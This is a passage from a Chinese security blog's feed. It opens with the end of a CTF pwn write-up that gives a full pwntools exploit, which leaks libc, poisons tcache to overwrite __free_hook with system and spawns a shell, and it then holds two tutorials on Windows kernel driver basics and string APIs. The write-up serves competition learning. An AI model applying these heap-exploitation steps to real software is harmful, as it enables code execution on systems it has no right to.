class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">free1(<span class="number">0</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x9</span>))<span class="comment">#0</span></span><br><span class="line">show2(<span class="number">0</span>)</span><br><span class="line">libc_addr=(u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)&amp;<span class="number">0xFFFFFFFFFFFFFF000</span>)-<span class="number">0x1ed000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这里还有一个需要注意的点，你泄露的 libc 的地址很不幸最低 2 位十六进制都是 0，所以 puts 带不出来，因此需要多覆盖一个字节才行。</p><img src="/2024/12/08/qwb2024_final/22.png" class=""><p>libc 地址有了后面就是简单的重叠堆构造 uaf，但同样需要注意 tcache bin 有数量检测，如果正常 free 一个 tcache 再修改 fd，则分配不出来这个任意地址的 tcache，必须要free两个堆块，然后再 edit 后进入的堆块才能够成功分配出来。</p><p>分配出来就直接打 tcache bin 写 system 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>))<span class="comment">#1</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)[:-<span class="number">1</span>])<span class="comment">#1</span></span><br><span class="line">free2(<span class="number">2</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])))<span class="comment">#2</span></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))<span class="comment">#3</span></span><br><span class="line">add2(base64.b64encode(p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line">free2(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><img src="/2024/12/08/qwb2024_final/23.png" class=""><p>至此艺术已成。</p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.85.95&#x27;,&#x27;37083&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your choice: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free1</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">free1(<span class="number">0</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x9</span>))<span class="comment">#0</span></span><br><span class="line">show2(<span class="number">0</span>)</span><br><span class="line">libc_addr=(u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)&amp;<span class="number">0xFFFFFFFFFFFFFF000</span>)-<span class="number">0x1ed000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>))<span class="comment">#1</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)[:-<span class="number">1</span>])<span class="comment">#1</span></span><br><span class="line">free2(<span class="number">2</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])))<span class="comment">#2</span></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))<span class="comment">#3</span></span><br><span class="line">add2(base64.b64encode(p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">同样的，决赛也出了两道pwn题，感觉挺有意思的，来补补wp。</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8决赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/"/>
    
    <category term="Pwn" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>windows驱动开发（1）——Windows驱动字符串</title>
    <link href="https://xia0ji233.github.io/2024/11/24/WindowsDriver1/"/>
    <id>https://xia0ji233.github.io/2024/11/24/WindowsDriver1/</id>
    <published>2024-11-24T15:00:00.000Z</published>
    <updated>2025-01-20T02:05:53.271Z</updated>
    
    <content type="html"><![CDATA[<p>来简单实战几个字符串API</p><span id="more"></span><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>ASCII 字符和宽字符的版本分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RtlInitAnsiString</span><br><span class="line">RtlInitUnicodeString</span><br></pre></td></tr></table></figure><p>第一个参数都是对应的字符串结构体的指针，也就是说，在使用的时候需要先定义一个结构体变量再去使用这个 API 去初始化字符串变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPSTR str2 = <span class="string">&quot;123456789 hello&quot;</span>;</span><br><span class="line">ANSI_STRING astr;</span><br><span class="line">RtlInitAnsiString(&amp;astr, str2);</span><br><span class="line"></span><br><span class="line">LPWSTR str = <span class="string">L&quot;123456789 hello&quot;</span>;</span><br><span class="line">UNICODE_STRING ustr;</span><br><span class="line">RtlInitUnicodeString(&amp;ustr, str);</span><br></pre></td></tr></table></figure><p>使用格式化字符串输出的 <code>%Z</code> 和 <code>%wZ</code> 可以直接输出该字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">kprintf((<span class="string">&quot;%Z\n&quot;</span>), astr);</span><br><span class="line">kprintf((<span class="string">&quot;%wZ\n&quot;</span>), ustr);</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2024/11/24/WindowsDriver1/1.png" class=""><h2 id="相互转换"><a href="#相互转换" class="headerlink" title="相互转换"></a>相互转换</h2><p>宽字符可以变 ASCII 字符，ASCII 字符也可以变宽字符。前提是它们都是 ASCII 范围内可以在不改变内容的情况下转换，如果使用 Unicode 字符将 Unicode 字符串转为 ASCII 字符串则可能会出现乱码。</p><p>事实证明想多了，即使是 ASCII 字符串，也能存放 Unicode 字符串。</p><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    ANSI_STRING astr;</span><br><span class="line">    UNICODE_STRING ustr;</span><br><span class="line">    LPWSTR str = <span class="string">L&quot;123456789 hello哈哈&quot;</span>;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ustr, str);</span><br><span class="line">    <span class="built_in">RtlUnicodeStringToAnsiString</span>(&amp;astr, &amp;ustr, TRUE);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;%p,%p\n&quot;</span>), ustr.Buffer, astr.Buffer);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;%Z\n&quot;</span>), astr);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2024/11/24/WindowsDriver1/2.png" class=""><p>这里的 API <code>RtlUnicodeStringToAnsiString(&amp;astr, &amp;ustr, TRUE);</code>，前两个参数，一个是目的字符串指针，一个是源字符串指针。第三个参数 TRUE 表示为目的字符串新分配内存，FALSE 表示不分配内存。</p><p>如果第三个参数设置为 FALSE 一定要注意，它会在 astr.buffer 中写入，因此一定要确保指向了一个正确的可写的内存，否则就会面临蓝屏。</p><p><code>RtlAnsiStringToUnicodeString</code> 这个 API 同理可得。</p><p>注意，使用<code>RtlUnicodeStringToAnsiString/RtlAnsiStringToUnicodeString</code>函数时，需要在使用完后调用<code>RtlFreeAnsiString/RtlFreeUnicodeString</code>函数来释放所分配的缓冲区，否则会产生内存泄露。</p><h2 id="数字与字符串之间的转换"><a href="#数字与字符串之间的转换" class="headerlink" title="数字与字符串之间的转换"></a>数字与字符串之间的转换</h2><p>在传统的 <code>CHAR */WCHAR *</code> 字符串中，我们只有 atoi，sprintf 等传统函数做数字与字符串之间的转换。 而内核就有很方便的 api 做转换，下面来看一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    UNICODE_STRING ustr,ustr2;</span><br><span class="line">    ULONG val,val2=<span class="number">0x12345678</span>;</span><br><span class="line">    LPWSTR str = <span class="string">L&quot;123456789&quot;</span>;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ustr, str);</span><br><span class="line">    <span class="built_in">RtlUnicodeStringToInteger</span>(&amp;ustr, <span class="number">10</span>, &amp;val);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;val=%d\n&quot;</span>), val);</span><br><span class="line"></span><br><span class="line">    WCHAR *S=(WCHAR*)<span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">0x1000</span>, <span class="string">&#x27;str&#x27;</span>);</span><br><span class="line">    ustr<span class="number">2.</span>Buffer=S;</span><br><span class="line">    ustr<span class="number">2.L</span>ength=<span class="number">0</span>;</span><br><span class="line">    ustr<span class="number">2.</span>MaximumLength=<span class="number">0x1000</span>;</span><br><span class="line">    <span class="built_in">RtlIntegerToUnicodeString</span>(val2, <span class="number">16</span>, &amp;ustr2);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;val=%wZ\n&quot;</span>), ustr2);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中第二个参数 base 指示了字符串是什么进制。</p><img src="/2024/11/24/WindowsDriver1/3.png" class=""><p>可以发现，从数字转字符串还是需要废一点功夫的，需要手动给 UNICODE_STRING 结构体初始化分配内存。</p><p>但是也是显然的，该例程会存在内存泄漏，当驱动被释放的时候，分配的内存不会释放，因此需要养成良好的习惯，当不使用这个字符串的时候，及时释放分配的内存。</p><h2 id="字符串拷贝与比较"><a href="#字符串拷贝与比较" class="headerlink" title="字符串拷贝与比较"></a>字符串拷贝与比较</h2><p>例程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    UNICODE_STRING s1;</span><br><span class="line">    WCHAR* S = (WCHAR*)<span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">0x1000</span>, <span class="string">&#x27;str&#x27;</span>);</span><br><span class="line">    s<span class="number">1.</span>Buffer = S;</span><br><span class="line">    s<span class="number">1.L</span>ength = <span class="number">0</span>;</span><br><span class="line">    s<span class="number">1.</span>MaximumLength = <span class="number">0x1000</span>;</span><br><span class="line">    <span class="built_in">RtlCopyUnicodeString</span>(&amp;s1, &amp;driver-&gt;DriverName);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;DriverName: %wZ\n&quot;</span>), s1);</span><br><span class="line">    <span class="keyword">auto</span> compare=<span class="built_in">RtlCompareUnicodeString</span>(&amp;s1, &amp;driver-&gt;DriverName, TRUE);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;compare=%d\n&quot;</span>), compare);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RtlCopyUnicodeString 就是简单的字符串拷贝函数，不做过多解释。</p><p>RtlCompareUnicodeString 是字符串比较函数，与 strcmp 一样，字符串相等返回 0，不相等返回非 0，第三个参数指示英文单词是否大小写敏感，TRUE 则敏感，S 与 s 视为不同的字符。</p><img src="/2024/11/24/WindowsDriver1/4.png" class=""><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>还有一系列的字符串操作函数也不一一展示了，它们都是 Rtl 为前缀命名的 API。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：MSDN</li></ul>]]></content>
    
    
    <summary type="html">来简单实战几个字符串API</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="驱动程序开发" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows驱动开发（0）——Windows驱动开发的基础知识</title>
    <link href="https://xia0ji233.github.io/2024/11/23/WindowsDriver0/"/>
    <id>https://xia0ji233.github.io/2024/11/23/WindowsDriver0/</id>
    <published>2024-11-22T19:00:00.000Z</published>
    <updated>2025-01-20T02:05:53.257Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下Windows驱动开发基础</p><span id="more"></span><p>由于之前操之过急，对驱动开发很多东西都没有了解便强行上手，导致后面困难重重，于是痛定思痛，开始推翻重来，相信之前的一些开发经验会让这一路好走一点。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vmware + VirtualKD + windbg preview 做调试环境。</p><p>VS 2022 + WDK 做开发环境。</p><p><a href="https://xia0ji233.pro/2023/04/13/driver1/">参考链接1</a></p><p><a href="https://xia0ji233.pro/2023/05/17/driver8/">参考链接2</a></p><h2 id="内核API的使用"><a href="#内核API的使用" class="headerlink" title="内核API的使用"></a>内核API的使用</h2><p>对于导出的函数，只需要包含对应的头文件直接使用即可，内核 API 的返回类型几乎都是 NTSTATUS。</p><p>当你调用的内核函数，如果返回的结果不是<code>STATUS_SUCCESS</code>，就说明函数执行中遇到了问题，具体是什么问题，可以在<code>ntstatus.h</code>文件中查看。</p><h2 id="驱动基本数据类型"><a href="#驱动基本数据类型" class="headerlink" title="驱动基本数据类型"></a>驱动基本数据类型</h2><p>WDK 对于一些标量有自己的书写习惯</p><table><thead><tr><th align="center">WDK 习惯</th><th align="center">SDK 习惯</th></tr></thead><tbody><tr><td align="center">ULONG</td><td align="center">unsigned long</td></tr><tr><td align="center">PULONG</td><td align="center">unsigned long*</td></tr><tr><td align="center">UCHAR</td><td align="center">unsigned char</td></tr><tr><td align="center">PUCHAR</td><td align="center">unsigned char*</td></tr><tr><td align="center">UINT</td><td align="center">unsigned int</td></tr><tr><td align="center">PUNIT</td><td align="center">unsigned int*</td></tr><tr><td align="center">VOID</td><td align="center">void</td></tr><tr><td align="center">PVOID</td><td align="center">void*</td></tr></tbody></table><h2 id="常用的内核内存函数"><a href="#常用的内核内存函数" class="headerlink" title="常用的内核内存函数"></a>常用的内核内存函数</h2><p>即，如何使用内核的堆内存，在用户层我们知道可以使用 malloc 或者一些 windows API，就算没有库也可以使用系统调用去申请内存。但是在内核层，内核的开发环境同样支持了一系列的内存分配函数。</p><p>内存对应的操作有：分配，释放，拷贝，清空。</p><table><thead><tr><th align="center">普通程序</th><th align="center">内核中</th></tr></thead><tbody><tr><td align="center">malloc</td><td align="center">ExAllocatePoolWithTag</td></tr><tr><td align="center">memset</td><td align="center">RtlFillMemory</td></tr><tr><td align="center">memcpy</td><td align="center">RtlMoveMemory</td></tr><tr><td align="center">free</td><td align="center">ExFreePool</td></tr></tbody></table><p>这里有个概念需要补一下，什么是<strong>分页内存</strong>，什么是<strong>非分页内存</strong>。</p><p>在使用 ExAllocatePoolWithTag 函数申请内存的时候会有<code>POOL_TYPE PoolType</code>这个参数。那么什么是<code>POOL_TYPE</code>，通过 WDK 我们可以看到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">POOL_TYPE</span> &#123;</span></span><br><span class="line">    NonPagedPool,</span><br><span class="line">    PagedPool,</span><br><span class="line">    NonPagedPoolMustSucceed,</span><br><span class="line">    DontUseThisType,</span><br><span class="line">    NonPagedPoolCacheAligned,</span><br><span class="line">    PagedPoolCacheAligned,</span><br><span class="line">    NonPagedPoolCacheAlignedMustS</span><br><span class="line">&#125; POOL_TYPE;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用的最多的就是前两个，<code>NonPagedPool</code>和<code>PagedPool</code>，前者分配<strong>非分页内存</strong>，后者申请<strong>分页内存</strong>。什么是<strong>分页内存</strong>，前面介绍过，在 Windows 操作系统中，有 pagefile.sys 这个文件，这个文件会保存长期不使用的物理页，如果申请<strong>分页内存</strong>，那么这个页就有可能会被置换到这个文件中去。等到再次需要的时候，会通过一个 0xE 号中断将该页从 pagefile.sys 中又取出来。</p><p>而<strong>非分页内存</strong>就是告诉操作系统，不要把我的申请的物理页撤走，这就是我独享的物理页。操作系统就不会把它给撤走转到文件中了。</p><p>至于有什么用，后面应该会看到。</p><h2 id="内核字符串"><a href="#内核字符串" class="headerlink" title="内核字符串"></a>内核字符串</h2><p>内核有两种字符串类型。<code>ANSI_STRING</code>&#x2F;<code>UNICODE_STRING</code> 分别表示 ASCII 字符和宽字符。</p><p>来看看它们的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125;STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaxmumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure><p>几乎都是这样的定义：长度，最大长度，字符指针，原因就是内核需要非常安全，直接操作字符容易造成一系列不可控的后果，因此在原字符指针上再封装一层。</p><p>同样来看看字符串的基本操作的 API 